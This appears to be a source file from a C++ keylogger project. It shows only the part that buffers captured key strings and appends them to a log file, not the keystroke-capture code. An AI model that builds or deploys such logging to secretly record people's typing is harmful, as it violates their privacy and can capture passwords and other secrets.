// KeyLogger.cpp
#include "../include/KeyLogger.hpp"
void KeyLogger::onKeyPress(std::string str) {
    keyBuffer += str + ",";
    if (keyBuffer.length() >= 2 * flushBufferSize){
        keyBuffer += "\r\n";
        flushBufferToFile();
        debug_log(LogLevel::Info, "memory");
        keyBuffer = "";
    }
}
void KeyLogger::flushBufferToFile(){
    debug_log(LogLevel::Info, "flush: ", keyBuffer);
    std::ofstream file;
    file.open(logfilepath, std::ios::app);  // 追記モード
    debug_log(LogLevel::Info, "open!");
    if (!file.is_open()) {
        debug_log(LogLevel::Info, "couldnt open file");
    }
    file << keyBuffer;
    file.close();
    //     keyBuffer.clear();
}